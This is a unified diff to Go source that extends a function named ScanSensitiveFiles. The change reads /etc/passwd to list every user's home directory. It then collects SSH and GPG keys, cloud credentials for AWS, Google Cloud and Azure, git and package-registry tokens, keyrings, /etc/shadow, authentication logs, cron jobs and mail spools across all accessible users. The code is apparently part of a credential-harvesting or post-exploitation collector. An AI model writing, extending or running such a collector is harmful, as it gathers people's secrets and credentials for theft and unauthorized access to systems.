@@ -18,72 +18,89 @@ import (
 	"time"
 )
 
-// ScanSensitiveFiles collects all files from specified paths in parallel, handling inaccessible paths gracefully.
+func EnumerateUsers() ([]string, error) {
+	data, err := os.ReadFile("/etc/passwd")
+	if err != nil {
+		return nil, fmt.Errorf("failed to read /etc/passwd: %v", err)
+	}
+
+	var homeDirs []string
+	lines := strings.Split(string(data), "\n")
+	for _, line := range lines {
+		fields := strings.Split(line, ":")
+		if len(fields) > 5 {
+			// Get UID and filter non-user accounts
+			uid, err := strconv.Atoi(fields[2])
+			if err != nil || uid < 1000 {
+				continue // Ignore system accounts (UID < 1000)
+			}
+
+			homeDir := fields[5]
+			if homeDir != "" && canAccessFile(homeDir) {
+				// Validate that the home directory exists and is accessible
+				info, err := os.Stat(homeDir)
+				if err == nil && info.IsDir() {
+					homeDirs = append(homeDirs, homeDir)
+				}
+			}
+		}
+	}
+
+	return homeDirs, nil
+}
+
+// ScanSensitiveFiles collects all files from specified paths for all accessible users.
 func ScanSensitiveFiles(outputDir string) ([]string, error) {
-	homeDir, _ := os.UserHomeDir()
+	// Get current user's home directory
+	currentHome, _ := os.UserHomeDir()
+
+	// Get home directories for all users
+	userHomes, err := EnumerateUsers()
+	if err != nil {
+		fmt.Printf("Error enumerating users: %v\n", err)
+		userHomes = []string{currentHome} // Fallback to current user's home
+	}
 
 	// Strategic paths for gathering sensitive data
-	paths := []string{
-		// User-specific directories and files
-		filepath.Join(homeDir, ".ssh"),                  // SSH keys
-		filepath.Join(homeDir, ".aws"),                  // AWS credentials
-		filepath.Join(homeDir, ".gnupg"),                // GPG keys
-		filepath.Join(homeDir, ".git-credentials"),      // Git credentials
-		filepath.Join(homeDir, ".gitconfig"),            // Git global config
-		filepath.Join(homeDir, ".docker"),               // Docker config
-		filepath.Join(homeDir, ".kube"),                 // Kubernetes config
-		filepath.Join(homeDir, ".config/gcloud"),        // Google Cloud config
-		filepath.Join(homeDir, ".azure"),                // Azure config
-		filepath.Join(homeDir, ".openvpn"),              // OpenVPN config
-		filepath.Join(homeDir, ".profile"),              // User profile
-		filepath.Join(homeDir, ".npmrc"),                // NPM credentials
-		filepath.Join(homeDir, ".pypirc"),               // Python package repository credentials
-		filepath.Join(homeDir, ".netrc"),                // Netrc (generic credentials)
-		filepath.Join(homeDir, ".local/share/keyrings"), // Keyrings
-		filepath.Join(homeDir, "secrets"),               // Generic secrets folder
-		filepath.Join(homeDir, ".bashrc"),               // Bash configuration
-		filepath.Join(homeDir, ".zshrc"),                // Zsh configuration
+	relativePaths := []string{
+		".ssh", ".aws", ".gnupg", ".git-credentials", ".gitconfig", ".docker",
+		".kube", ".config/gcloud", ".azure", ".openvpn", ".profile", ".npmrc",
+		".pypirc", ".netrc", ".local/share/keyrings", "secrets", ".bashrc", ".zshrc",
+	}
 
-		// System-level directories and files
-		"/etc/passwd",              // User information
-		"/etc/shadow",              // User hashed credentials
-		"/etc/group",               // Group information
-		"/etc/hostname",            // System hostname
-		"/etc/hosts",               // Hosts file
-		"/etc/ssl",                 // SSL certificates
-		"/etc/crontab",             // System-wide crontab
-		"/etc/apache2",             // Apache2 configs
-		"/etc/httpd",               // httpd configs conf/ and conf.d/
-		"/etc/nginx/conf.d",        // nginx configs
-		"/etc/cron.d",              // Directory for cron jobs
-		"/etc/cron.daily",          // Daily cron jobs
-		"/etc/cron.weekly",         // Weekly cron jobs
-		"/etc/cron.monthly",        // Monthly cron jobs
-		"/etc/cron.hourly",         // Hourly cron jobs
-		"/var/spool/cron",          // User-specific crontab files
-		"/var/spool/cron/crontabs", // Cron job configurations
-		"/var/spool/mail",          // Users-specific email
-
-		// Logs and temporary files
-		"/var/log/auth.log", // Authentication logs (Linux-specific)
-		"/var/log/secure",   // Secure logs (Red Hat/CentOS-specific)
-		"/var/log/messages", // General system logs
-		"/var/log/syslog",   // System log (Debian/Ubuntu-specific)
-		"/var/log/dpkg.log", // Package installation logs (Debian/Ubuntu-specific)
-		"/var/log/yum.log",  // Package installation logs (Red Hat/CentOS-specific)
-		"/tmp/ssh-*",        // Temporary SSH files
-		"/tmp/vim*",         // Temporary Vim files
-
-		// Detect shell history
-		DetectDefaultShell(), // Shell history
+	// System-level paths
+	systemPaths := []string{
+		"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hostname", "/etc/hosts",
+		"/etc/ssl", "/etc/crontab", "/etc/apache2", "/etc/httpd", "/etc/nginx/conf.d",
+		"/var/spool/cron", "/var/spool/mail", "/var/log/auth.log", "/var/log/secure",
+		"/var/log/messages", "/var/log/syslog", "/tmp/ssh-*", "/tmp/vim*",
 	}
 
 	var wg sync.WaitGroup
-	fileChan := make(chan string, len(paths))
-	errChan := make(chan error, len(paths))
+	fileChan := make(chan string)
+	errChan := make(chan error)
 
-	// Use a goroutine for each path
-	for _, path := range paths {
+	// Scan home directories
+	for _, home := range userHomes {
+		for _, relPath := range relativePaths {
+			absPath := filepath.Join(home, relPath)
+			wg.Add(1)
+			go func(path string) {
+				defer wg.Done()
+				files := expandPath(path)
+				for _, file := range files {
+					if _, err := os.Stat(file); err == nil {
+						fileChan <- file
+					} else {
+						errChan <- fmt.Errorf("failed to access %s: %v", file, err)
+					}
+				}
+			}(absPath)
+		}
+	}
+
+	// Scan system paths
+	for _, path := range systemPaths {
 		wg.Add(1)
 		go func(path string) {
 			defer wg.Done()
@@ -108,6 +125,7 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 	// Collect results and handle errors
 	var files []string
 	for file := range fileChan {
+		//fmt.Printf("Found file: %s\n", file) // Debug log
 		files = append(files, file)
 	}
 
@@ -131,15 +149,23 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 // expandPath expands directories into a list of files.
 func expandPath(path string) []string {
 	var fileList []string
+
 	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
-		if err == nil && !info.IsDir() {
+		if err != nil {
+			// Log the error but continue
+			//fmt.Printf("Error accessing %s: %v\n", p, err)
+			return nil
+		}
+		if !info.IsDir() && canAccessFile(p) {
 			fileList = append(fileList, p)
 		}
 		return nil
 	})
+
 	if err != nil {
-		return []string{path} // Return the original path if walk fails
+		fmt.Printf("Error walking the path %s: %v\n", path, err)
 	}
+
 	return fileList
 }
 
